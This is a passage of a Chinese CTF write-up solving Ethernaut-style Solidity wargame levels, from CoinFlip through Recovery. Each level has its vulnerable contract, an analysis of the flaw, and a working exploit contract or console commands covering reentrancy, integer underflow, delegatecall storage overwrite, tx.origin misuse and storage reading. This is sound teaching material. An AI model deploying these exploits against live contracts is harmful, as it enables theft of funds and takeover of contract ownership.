consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract hack&#123; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; address instance_address = 0x3205e72483e9568c0959384f9c13672c3566c4a1; CoinFlip c = CoinFlip(instance_address); function exploit() public &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; c.flip(side); &#125;&#125; 调用 10 次 exploit() 即可 TelephoneRequire Claim ownship of the contract below to complete this level Source12345678910111213141516pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; Analyse 这里区分一下 tx.origin 和 msg.sender ，msg.sender是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 tx.origin 则必然是这个交易的原始发起方，无论中间有多少次合约内/跨合约函数调用，而且一定是账户地址而不是合约地址。 给定这样一个场景如：用户通过 合约A 调 合约B ，此时： 对于 合约A ：tx.origin和msg.sender都是用户 对于 合约B ：tx.origin是用户，msg.sender是 合约A所以，这里部署一个第三方合约即可。 Solution12345678910111213141516171819202122232425pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract hack &#123; address instance_address = 0x852cd04ec66730198e709eb4261d3fa926bc92d8; Telephone t = Telephone(instance_address); function exploit() public &#123; t.changeOwner(msg.sender); &#125;&#125; 攻击者调用 exploit() 即可 TokenRequire The goal of this level is for you to hack the basic token contract below. You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens. Source12345678910111213141516171819202122pragma solidity ^0.4.18;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; function Token(uint _initialSupply) public &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125;&#125; Analyse 经典的整数溢出问题，在 transfer() 函数第一行 require 里，这里的 balances 和 value 都是 uint 。此时 balances 为 20 ，令 value=21 ，产生下溢，从而绕过验证，并转出一笔很大的金额。 Solution1234// 转给谁不重要，关键是利用 20-21 触发整数下溢await contract.transfer(0, 21);// 可以看一下自己现在的 token 有多少（非常之多）await contract.balanceOf(player); 但是也并非没有办法来处理该问题，最简单的处理是在每一次数学运算时进行判断，如 a=a+b ；就可以写成 if(a+b&gt;a) a=a+b; 。题目建议的另一种解决方案则是使用 OpenZeppelin团队 开发的 SafeMath库 ，如果整数溢出漏洞发生时，函数将进行回退操作，此时加法操作可以写作这样：a=a.add(b); DelegationRequire claim ownership of the instance Source12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Delegate &#123; address public owner; function Delegate(address _owner) public &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; function Delegation(address _delegateAddress) public &#123; delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; function() public &#123; if(delegate.delegatecall(msg.data)) &#123; this; &#125; &#125;&#125; Analyse 我们看下 delegatecall 的文档 There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values. 考点一 考点一在于 Solidity 支持两种底层调用方式 call 和 delegatecall call 外部调用时，上下文是外部合约 delegatecall 外部调用时，上下文是调用合约 所以 delegate.delegatecall(msg.data) 其实调用的是 delegate 自身的 msg.data 考点二 熟悉 raw 格式的交易的 data 的会知道：data 头4个 byte 是被调用方法的签名哈希，即 bytes4(keccak256(&quot;func&quot;)) , remix 里调用函数，实际是向合约账户地址发送了( msg.data[0:4] == 函数签名哈希 )的一笔交易 所以我们只需调用 Delegation 的 fallback 的同时在 msg.data 放入 pwn 函数的签名即可 考点三 这里其实主要思路就是 fallback 的触发条件： 一是如果合约在被调用的时候，找不到对方调用的函数，就会自动调用 fallback 函数 二是只要是合约收到别人发送的 Ether 且没有数据，就会尝试执行 fallback 函数，此时 fallback 需要带有 payable 标记，否则，合约就会拒绝这个 Ether 综上，我们只需调用 Delegation 的 假pwn() 即可，这样就会触发 Delegation 的 fallback ，这样 pwn 的函数签名哈希就会放在 msg.data[0:4] 了，这样就会只需 delegate 的 pwn() 把 owner 变成自己 Solution web3 中 sha3 就是 keccak256 ForceRequire make the balance of the contract greater than zero Source1234567891011pragma solidity ^0.4.18;contract Force &#123;/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m)*/&#125; Analyse 骚操作， selfdestruct 自毁合约强转 所以只需要再部署一个合约，打一点钱，然后自毁把合约金额转给目标合约即可 Solution1234567891011121314pragma solidity ^0.4.18; contract Force &#123;&#125;contract hack &#123; address instance_address = 0xe0a165650f7b04bde4fda5845d41aaf947703dd2; Force target = Force(instance_address); function hack() payable &#123;&#125; function exploit() payable public &#123; selfdestruct(target); &#125;&#125; 部署 hack 的时候转一点钱，然后执行 exploit() 即可 VaultRequire Unlock the vault to pass the level! Source1234567891011121314151617pragma solidity ^0.4.18;contract Vault &#123; bool public locked; bytes32 private password; function Vault(bytes32 _password) public &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; Analyse 通关条件是 locked = false 考点关键是区块链上的所有信息是公开的 可以用 web3 的 getStorageAt 来访问合约里变量的值 Solution KingRequire When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation. Source123456789101112131415161718192021pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract King is Ownable &#123; address public king; uint public prize; function King() public payable &#123; king = msg.sender; prize = msg.value; &#125; function() external payable &#123; require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; &#125;&#125; Analyse 代码逻辑很简单，谁给的钱多谁就能成为 King ，并且将前任 King 的钱归还。当提交 instance 时，题目会重新夺回 King 的位置，需要阻止其他人成为 King方可通关 首先看一下 Solidity 中几种转账方式： address.transfer()当发送失败时会 throw ；回滚状态只会传递部分 Gas 供调用，防止重入 address.send()当发送失败时会返回 false只会传递部分 Gas 供调用，防止重入 address.call.value()()当发送失败时会返回 false传递所有可用 Gas 供调用，不能有效防止重入 回头看下代码，当我们成为 King 后，如果有人出价比我们高，会首先把钱退回给我们，使用的是 transfer ，上面提到当 transfer 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，那么代码将无法继续向下运行，其他人也就无法成为新的 King，达到攻击效果 Solution 首先查看一下当前最高出价 12await fromWei((await contract.prize()).toNumber())// 1 eth 部署一个新的合约，当收到转账时主动抛出错误 123456789101112131415pragma solidity ^0.4.18;contract Attack &#123; address instance_address = 0xa4d38a8591b7e16bea4fe0f64cd77ee7243f1cdc; function Attack() payable&#123;&#125; function hack() public &#123; instance_address.call.value(1.1 ether)(); &#125; function () public &#123; throw; &#125;&#125; 调用 hack() 即可，可以看到调用 hack() 后成为了新的 King ，而且 Submit innstance 后，仍然是 King Re-entrancyRequire The goal of this level is for you to steal all the funds from the contract Source12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Reentrance &#123; using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] = balances[_to].add(msg.value); &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125; Analyse DASP 排第一的重入漏洞，也是著名的 DAO 事件里用到的方法 漏洞主要在于 withdraw() 函数，合约在进行提币时，使用 require 依次判断提币账户是否拥有相应的资产，随后使用 msg.sender.call.value(amount) 来发送 Ether ，处理完成后相应修改用户资产数据 在提币的过程中，存在一个递归 withdraw 的问题（因为 -=_amount 在转账之后），攻击者可以部署一个包含恶意递归调用的合约将公共钱包合约里的 Ether 全部提出 其中，转账使用的是 address.call.value()() 函数，传递了所有可用 gas 供调用，是可以成功执行递归的前提条件 Solution 查看题目账户余额信息： Reentrance 合约余额为 1 eth balances[address(Attacker)] = 0 所以部署 Attacker 合约时，可以给 Attacker 合约先转 1 eth ，然后 donate 1 eth ，这样的话 Reentrance 合约余额就是 2 eth 了，balances[address(Attacker)] 就是 1 eth ，然后每次 withdraw 1 eth，这样的话，重入 2 次就能将钱全部转出 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960pragma solidity ^0.4.19;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125;contract Attacker&#123; address instance_address = 0x54426463ef0ff0c720e9947f79ab6a770fda34f4; Reentrance target = Reentrance(instance_address); uint have_withdraw = 0; function Attacker() payable &#123;&#125; function get_balance() public view returns (uint)&#123; return target.balanceOf(this); &#125; function get_balance_ins() public view returns (uint)&#123; return instance_address.balance; &#125; function get_balance_my() public view returns (uint)&#123; return address(this).balance; &#125; function donate() public payable&#123; target.donate.value(1 ether)(this); &#125; function() payable&#123; if (have_withdraw == 0 &amp;&amp; msg.sender == instance_address)&#123; have_withdraw = 1; target.withdraw(1 ether); &#125; &#125; function hack()&#123; target.withdraw(1 ether); &#125;&#125; 合约刚部署好余额如下 调用 Attacker 的 donate() 调用 hack() 进行重入攻击 2 次，可以看到 Reentrance 合约余额变为 0 ，而 balances[address(Attacker)] = 1 - 2 ，由于是 uint256 类型，所以下溢变成了 uint256 类型最大值，攻击成功 ElevatorRequire reach the top of your building Source123456789101112131415161718192021pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125; Analyse 通关条件是使 contract.top = true Building 接口中声明了 isLastFloor 函数，用户可自行编写 在主合约中，先调用 building.isLastFloor(floor) 进行 if 判断，然后将 building.isLastFloor(floor) 赋值给 top 。要使 top = ture ，则 building.isLastFloor(floor) 第一次调用需返回 false ，第二次调用返回 true 所以就有了思路：设置一个初始值为 true 的变量，每次调用 isLastFloor() 时，将其取反再返回 但是，题目在声明 isLastFloor 时，赋予了 view 属性，view 表示函数会读取合约变量，但是不会修改任何合约的状态 看了下题目的提示Sometimes solidity is not good at keeping promises. 翻阅了文档，找到对 view 的描述：view functions: The compiler does not enforce yet that a view method is not modifying state. 意思是当前 Solidity 编译器没有强制执行 view 函数不能修改状态，所以上述做法就是可行的1234567891011121314151617181920212223242526272829303132pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125;contract hack &#123; address instance_address = 0x89fa2727ad30129f657994117323f7e15b3c626a; Elevator e = Elevator(instance_address); bool public flag = true; function isLastFloor(uint) public returns (bool)&#123; flag = !flag; return flag; &#125; function exploit() public&#123; e.goTo(123); &#125;&#125; 调用 exploit() 即可 PrivacyRequire Unlock this contract to beat the level Source123456789101112131415161718192021222324252627282930pragma solidity ^0.4.18;contract Privacy &#123; bool public locked = true; uint256 public constant ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; function Privacy(bytes32[3] _data) public &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */&#125; Analyse 之前 Vault 题目的升级版，还是一样，用 getStorageAt() 把链上的数据读出来 Solution12345678910await web3.eth.getStorageAt(instance, 0, function(x,y)&#123;console.info(y);&#125;)// 0x000000000000000000000000000000000000000000000000000000df9dff0a01await web3.eth.getStorageAt(instance, 1, function(x,y)&#123;console.info(y);&#125;)// 0x85b05e35e73af32ed1948f0a1a58d8a67e449f77eb22222decfef426f1936586await web3.eth.getStorageAt(instance, 2, function(x,y)&#123;console.info(y);&#125;)// 0x9daa83d6f3dbb320583dc59ed67813a5adc473d0d2ff18c0be08ef1a46a037b0await web3.eth.getStorageAt(instance, 3, function(x,y)&#123;console.info(y);&#125;)// 0xf001da34b0220001e65b894cb5ea3d0a3155843c51477b29215a6aa43348b697await web3.eth.getStorageAt(instance, 4, function(x,y)&#123;console.info(y);&#125;)// 0x0000000000000000000000000000000000000000000000000000000000000000 可以看到，每一个存储位是 32 个字节。根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话，除去 ID 常量无需存储： bool public locked = true 占 1 字节 -&gt; 01 uint8 private flattening = 10 占 1 字节 -&gt; 0a uint8 private denomination = 255 占 1 字节 -&gt; ff uint16 private awkwardness = uint16(now) 占 2 字节 -&gt; df9d 刚好对应了第一个存储位的 df9dff0a0a 所以 data[2] 应该在第四个存储位 0xf001da34b0220001e65b894cb5ea3d0a3155843c51477b29215a6aa43348b697 Gatekeeper OneRequire Make it past the gatekeeper and register as an entrant to pass this level. Source12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract GatekeeperOne &#123; using SafeMath for uint256; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(msg.gas.mod(8191) == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; Analyse 满足三个 modifier 条件即可 gateOne 很简单，通过第三方合约调用 enter 即可 gateTwo 需要满足 msg.gas % 8191 == 0 msg.gas 是 remaining gas ，在 remix 的 Javascript VM 环境下进行 Debug， 在 Step detail 可以看到这个变量，假设在进入 enter 之前的 remaining gas = 81910 调试到 gateTwo 的 msg.gas 地方，此时 remaining gas = 81697 那么这个过程间消耗的 gas = 81910 - 81697，加上 gas 本身消耗的 2 即可，所以为了满足 gateTwo，在进入 enter 之前的 gas 可以设置为 81910-91697+81910+2 gateThree 也比较简单，最后的逻辑是将 tx.origin 倒数三四字节换成 0000 即可，可以通过 bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF 实现 Solution1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.4.18; contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(msg.gas % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; contract MyAgent &#123; GatekeeperOne c; function MyAgent(address _c) &#123; c = GatekeeperOne(_c); &#125; function exploit() &#123; bytes8 _gateKey = bytes8(msg.sender) &amp; 0xffffffff0000ffff; c.enter.gas(81910-81697+81910+2)(_gateKey); &#125;&#125; 调用 exploit() 即可 Gatekeeper TwoRequire Register as an entrant to pass this level Source12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; Analyse 满足三个 modifier 即可 gateOne 很简单，通过第三方合约调用 enter 即可 gateThree 毕竟简单，直接异或逆运算 _gateKey = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1)) gateTwo 比较有技巧性，用了 内联汇编 的写法，翻了一下文档 https://ethereum.github.io/yellowpaper/paper.pdf ： caller : Get caller address. extcodesize : Get size of an account’s code. 按照题目的意思，要使当前合约代码区为空，显然与解题是矛盾的，仔细读文档，有一些细节 Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.……During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code. 也就是说，在执行初始化代码（构造函数），而新的区块还未添加到链上的时候，新的地址已经生成，然而代码区为空，此时，调用 EXTCODESIZE() 返回为 0 那么，只需要在第三方合约的构造函数中调用题目合约中的 enter() 即可 Solution12345678910111213141516171819202122232425262728293031323334353637pragma solidity ^0.4.18;contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125;contract hack &#123; function hack(address _c) &#123; GatekeeperTwo c = GatekeeperTwo(_c); bytes8 _gateKey = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1)); c.enter(_gateKey); &#125;&#125; 直接部署合约 hack 即可 Naught CoinRequire Complete this level by getting your token balance to 0. Source1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol'; contract NaughtCoin is StandardToken &#123; using SafeMath for uint256; string public constant name = 'NaughtCoin'; string public constant symbol = '0x0'; uint public constant decimals = 18; uint public timeLock = now + 10 years; uint public INITIAL_SUPPLY = (10 ** decimals).mul(1000000); address public player; function NaughtCoin(address _player) public &#123; player = _player; totalSupply_ = INITIAL_SUPPLY; balances[player] = INITIAL_SUPPLY; Transfer(0x0, player, INITIAL_SUPPLY); &#125; function transfer(address _to, uint256 _value) lockTokens public returns(bool) &#123; super.transfer(_to, _value); &#125; // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() &#123; if (msg.sender == player) &#123; require(now &gt; timeLock); _; &#125; else &#123; _; &#125; &#125; &#125; Analyse 根据题意，需要将自己的 balance 清空。合约提供了 transfer() 进行转账，但有一个 modifier lockTokens() 限制，只有 10 年后才能调用 transfer() 注意该合约是 StandardToken 的子合约，题目中也给了 The ERC20 Spec 和 The OpenZeppelin codebase 在子合约找不出更多信息的时候，把目光更多放到父合约 StandardToken.sol 和接口上 在 The ERC20 Spec 中，除了 transfer() 之外，还有 transferFrom() 函数也可以进行转账 直接看父合约 StandardToken.sol 12345678910111213contract StandardToken &#123; using ERC20Lib for ERC20Lib.TokenStorage; ERC20Lib.TokenStorage token; ... function transfer(address to, uint value) returns (bool ok) &#123; return token.transfer(to, value); &#125; function transferFrom(address from, address to, uint value) returns (bool ok) &#123; return token.transferFrom(from, to, value); &#125; ...&#125; 跟进 ERC20Lib.sol 1234567891011121314151617181920212223242526library ERC20Lib &#123; ... function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) &#123; self.balances[msg.sender] = self.balances[msg.sender].minus(_value); self.balances[_to] = self.balances[_to].plus(_value); Transfer(msg.sender, _to, _value); return true; &#125; function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) &#123; var _allowance = self.allowed[_from](msg.sender); self.balances[_to] = self.balances[_to].plus(_value); self.balances[_from] = self.balances[_from].minus(_value); self.allowed[_from](msg.sender) = _allowance.minus(_value); Transfer(_from, _to, _value); return true; &#125; ... function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) &#123; self.allowed[msg.sender](_spender) = _value; Approval(msg.sender, _spender, _value); return true; &#125;&#125; 可以直接调用这个 transferFrom ，但是 transferFrom 需要 msg.sender 获得授权，由于我们就是合约的 owner ，所以可以自己调用 approve 给自己授权 Solution12await contract.approve(player, (await contract.INITIAL_SUPPLY()).toNumber())await contract.transferFrom(player, instance, (await contract.INITIAL_SUPPLY()).toNumber()) PreservationRequire This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored. The goal of this level is for you to claim ownership of the instance you are given. Source123456789101112131415161718192021222324252627282930313233343536373839pragma solidity ^0.4.23;contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(setTimeSignature, _timeStamp); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(setTimeSignature, _timeStamp); &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125; Analyse delegatecall 定义：.delegatecall(…) returns (bool): issue low-level DELEGATECALL, returns false on failure, forwards all available gas, adjustable delegatecall 与 call 功能类似，区别在于 delegatecall 仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。注意 delegatecall 是危险函数，它可以完全操作当前合约的状态，可以参考第7题 Delegation delegateCall 方法仅仅使用目标合约的代码， 其余的 storage 等数据均使用自己的，这就使得某些访存操作会错误的处理对象 所以这个题可以这样解决： 我们调用 Preservation 的 setFirstTime 函数实际通过 delegatecall 执行了 LibraryContract 的 setTime 函数，修改了 slot 1 ，也就是修改了 timeZone1Library 变量 这样，我们第一次调用 setFirstTime 将 timeZone1Library 变量修改为我们的恶意合约的地址，第二次调用 setFirstTime 就可以执行我们的任意代码了 Solution1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859pragma solidity ^0.4.23;contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(setTimeSignature, _timeStamp); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(setTimeSignature, _timeStamp); &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125;contract attack &#123; address public timeZone1Library; address public timeZone2Library; address public owner; address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c; Preservation target = Preservation(instance_address); function attack1() &#123; target.setFirstTime(uint(address(this))); &#125; function attack2() &#123; target.setFirstTime(uint(0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2)); &#125; function setTime(uint _time) public &#123; timeZone1Library = address(_time); timeZone2Library = address(_time); owner = address(_time); &#125;&#125; 先调用 attack1() ，再调用 attack2() 即可 LockedRequire This name registrar is locked and will not accept any new names to be registered. Unlock this registrar to beat the level. Source123456789101112131415161718192021222324252627pragma solidity ^0.4.23; // A Locked Name Registrarcontract Locked &#123; bool public unlocked = false; // registrar locked, no name updates struct NameRecord &#123; // map hashes to addresses bytes32 name; // address mappedAddress; &#125; mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses function register(bytes32 _name, address _mappedAddress) public &#123; // set up the new NameRecord NameRecord newRecord; newRecord.name = _name; newRecord.mappedAddress = _mappedAddress; resolve[_name] = _mappedAddress; registeredNameRecord[msg.sender] = newRecord; require(unlocked); // only allow registrations if contract is unlocked &#125;&#125; Analyse 典型的利用 struct 默认是 storage 的题目 函数中声明的 newRecord 结构体修改 name 和 mappedAddress 实际分别改的是 unlocked 和 bytes32 name 所以把 name 对应的 slot 0 的值改成 1 就行了 Solution1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.23; // A Locked Name Registrarcontract Locked &#123; bool public unlocked = false; // registrar locked, no name updates struct NameRecord &#123; // map hashes to addresses bytes32 name; // address mappedAddress; &#125; mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses function register(bytes32 _name, address _mappedAddress) public &#123; // set up the new NameRecord NameRecord newRecord; newRecord.name = _name; newRecord.mappedAddress = _mappedAddress; resolve[_name] = _mappedAddress; registeredNameRecord[msg.sender] = newRecord; require(unlocked); // only allow registrations if contract is unlocked &#125;&#125;contract hack &#123; address instance_addr = 0xfce5ca4942678982889e6c9934a2afb02c670098; Locked target = Locked(instance_addr); function exploit() &#123; target.register(1, tx.origin); &#125;&#125; 调用 exploit() 即可 RecoveryRequire A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address. This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address 其实简单来说就是已知一个 Recovery 合约地址，恢复一下它创建的 SimpleToken 地址，然后将 0.5 eth 从丢失地址的合约中提出即可 Source12345678910111213141516171819202122232425262728293031323334353637383940414243pragma solidity ^0.4.23;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Recovery &#123; //generate tokens function generateToken(string _name, uint256 _initialSupply) public &#123; new SimpleToken(_name, msg.sender, _initialSupply); &#125;&#125;contract SimpleToken &#123; using SafeMath for uint256; // public variables string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string _name, address _creator, uint256 _initialSupply) public &#123; name = _name; balances[_creator] = _initialSupply; &#125; // collect ether in return for tokens function() public payable &#123; balances[msg.sender] = msg.value.mul(10); &#125; // allow transfers of tokens function transfer(address _to, uint _amount) public &#123; require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender].sub(_amount); balances[_to] = _amount; &#125; // clean up after ourselves function destroy(address _to) public &#123; selfdestruct(_to); &#125;&#125; Analyse 区块链上所有信息都是公开的，直接上 ropsten 测试网的官方网页查就可以了 Solution方法一 从 console 找到实例地址：0xd29fcc4b193a576a17af9194d706b17ce5da24e2 通过 ropsten.etherscan.io 找到这个实例的交易信息：https://ropsten.etherscan.io/address/0xd29fcc4b193a576a17af9194d706b17ce5da24e2#internaltx 再通过交易信息找到生产合约 lost contract 的地址: 0x77a70a61a077e3aee72404e0e70211bfa72e962b 在 remix 部署 SimpleToken ，使用 At address 指定 lost contract 的地址，然后执行 destroy(play_address) 即可 查看合约地址可以看到已经被销毁https://ropsten.etherscan.io/address/0x77a70a61a077e3aee72404e0e70211bfa72e962b#internaltx 一些分析 方法一提交之后，Zeppelin 给出了原理如下： Contract addresses are deterministic and are calculated by keccack256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.An interesting blog post by Martin Swende details potential use cases of this.If you’re going to implement this technique, make sure you don’t miss the nonce, or your funds will be lost forever. 原来题目的考点是合约地址可计算，所以这题有两种解法 方法二 参考 https://www.freebuf.com/articles/blockchain-articles/179662.html 参考 https://github.com/ethereum/wiki/wiki/RLP 12345678910111213141516171819202122232425def rlp_encode(input): if isinstance(input,str): if len(input) == 1 and ord(input) &lt; 0x80: return input else: return encode_length(len(input), 0x80) + input elif isinstance(input,list): output = '' for item in input: output += rlp_encode(item) return 